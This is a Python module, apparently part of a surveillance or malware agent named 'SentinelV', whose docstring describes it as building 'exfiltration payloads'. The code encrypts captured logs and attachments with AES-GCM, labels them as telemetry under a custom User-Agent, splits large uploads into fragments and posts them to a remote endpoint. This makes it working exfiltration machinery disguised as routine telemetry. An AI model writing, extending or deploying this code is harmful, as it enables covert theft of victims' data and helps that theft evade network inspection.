import io
import json
import logging
import os
from datetime import datetime
from typing import Dict, Mapping, Optional

import requests
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("SentinelV.TelemetryDispatcher")


class TelemetryDispatcher:
    """Capa dedicada a cifrado AES-256 y armado de payloads de exfiltración."""

    def __init__(self, key: Optional[bytes] = None) -> None:
        self._key = key or os.urandom(32)
        self._aesgcm = AESGCM(self._key)
        self._session = requests.Session()
        self._session.headers.update({"User-Agent": "SentinelV-Agent/1.0"})

    @property
    def session(self) -> requests.Session:
        return self._session

    @property
    def key(self) -> bytes:
        return self._key

    def encrypt_log(self, log_text: str) -> bytes:
        plaintext = log_text.encode("utf-8")
        nonce = os.urandom(12)
        ciphertext = self._aesgcm.encrypt(nonce, plaintext, None)
        return nonce + ciphertext

    def encrypt_bytes(self, data: bytes) -> bytes:
        nonce = os.urandom(12)
        ciphertext = self._aesgcm.encrypt(nonce, data, None)
        return nonce + ciphertext

    def build_payload(
        self,
        encrypted_log: bytes,
        attachments: Mapping[str, bytes],
        metadata: Optional[Dict[str, str]] = None,
    ) -> Dict[str, tuple]:
        payload: Dict[str, tuple] = {
            "log": ("log.enc", encrypted_log, "application/octet-stream"),
            "metadata": (
                "metadata.json",
                json.dumps(metadata or {}).encode("utf-8"),
                "application/json",
            ),
        }
        for filename, binary in attachments.items():
            payload[filename] = (filename, binary, "application/octet-stream")
        return payload

    def send_payload(
        self,
        endpoint: str,
        encrypted_log: bytes,
        # FIX: attachments ahora tiene valor por defecto para compatibilidad con Agent.py
        attachments: Optional[Mapping[str, bytes]] = None,
        metadata: Optional[Dict[str, str]] = None,
        timeout: int = 15,
    ) -> requests.Response:
        # FIX: normalizar attachments a dict vacío si no se pasa
        if attachments is None:
            attachments = {}
        try:
            encrypted_attachments = {
                filename: self.encrypt_bytes(payload)
                for filename, payload in attachments.items()
            }
            total_size = len(encrypted_log) + sum(len(data) for data in encrypted_attachments.values())
            if total_size > 8 * 1024 * 1024:
                return self._send_fragmented_payload(
                    endpoint,
                    encrypted_log,
                    encrypted_attachments,
                    metadata,
                    timeout,
                )

            files = self.build_payload(encrypted_log, encrypted_attachments, metadata)
            response = self._session.post(
                endpoint,
                files=files,
                data={
                    "agent_id": "sentinel-v",
                    "timestamp": datetime.utcnow().isoformat() + "Z",
                },
                timeout=timeout,
                verify=True,
            )
            response.raise_for_status()
            logger.info("Payload enviado correctamente a %s", endpoint)
            return response
        except requests.RequestException as exc:
            logger.warning("Error de red al enviar payload: %s", exc)
            raise
        except Exception as exc:
            logger.warning("Fallo inesperado al enviar payload: %s", exc)
            raise

    def _send_fragmented_payload(
        self,
        endpoint: str,
        encrypted_log: bytes,
        attachments: Mapping[str, bytes],
        metadata: Optional[Dict[str, str]] = None,
        timeout: int = 15,
    ) -> requests.Response:
        chunk_size = 2 * 1024 * 1024
        fragments = []
        current_chunk = b""
        current_size = 0

        for filename, data in attachments.items():
            if current_size + len(data) > chunk_size:
                if current_chunk:
                    fragments.append(current_chunk)
                    current_chunk = b""
                    current_size = 0
            current_chunk += data
            current_size += len(data)

        if current_chunk:
            fragments.append(current_chunk)

        response = None
        for i, fragment in enumerate(fragments):
            frag_metadata = metadata.copy() if metadata else {}
            frag_metadata["fragment"] = f"{i+1}/{len(fragments)}"
            frag_metadata["total_fragments"] = str(len(fragments))

            files = {
                "log": ("log.enc", encrypted_log if i == 0 else b"", "application/octet-stream"),
                "metadata": (
                    "metadata.json",
                    json.dumps(frag_metadata).encode("utf-8"),
                    "application/json",
                ),
                "fragment": (f"fragment_{i+1}.bin", fragment, "application/octet-stream"),
            }

            response = self._session.post(
                endpoint,
                files=files,
                data={
                    "agent_id": "sentinel-v",
                    "timestamp": datetime.utcnow().isoformat() + "Z",
                },
                timeout=timeout,
                verify=True,
            )
            response.raise_for_status()
            logger.info(
                "Fragmento %d/%d enviado a %s (%.2f MB)",
                i + 1, len(fragments), endpoint, len(fragment) / (1024 * 1024),
            )

        if response is None:
            raise RuntimeError("No se generaron fragmentos para enviar")
        return response

    def close_session(self) -> None:
        try:
            self._session.close()
        except Exception:
            pass
